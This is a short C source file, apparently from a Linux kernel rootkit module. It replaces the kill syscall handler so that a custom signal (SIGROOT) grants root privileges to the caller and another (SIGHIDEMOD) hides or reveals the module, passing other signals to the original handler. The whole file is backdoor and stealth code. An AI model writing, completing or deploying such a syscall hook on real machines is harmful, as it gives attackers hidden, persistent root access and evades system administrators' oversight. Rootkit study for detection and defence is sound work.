#include "my_syscalls.h"


pt_regs_t orig_kill;

asmlinkage unsigned long my_kill(const struct pt_regs *regs) {
        int sig = regs->si;
        if (sig == SIGROOT) {
                printk(KERN_INFO "rootkit: Received signal SIGROOT. It works!\n");
                give_root();
                return 0;
        }
        if (sig == SIGHIDEMOD) {
                if (visiblity == HIDDEN) show_rootkit();
                else hide_rootkit();
                return 0;
        }

        return orig_kill(regs);
}
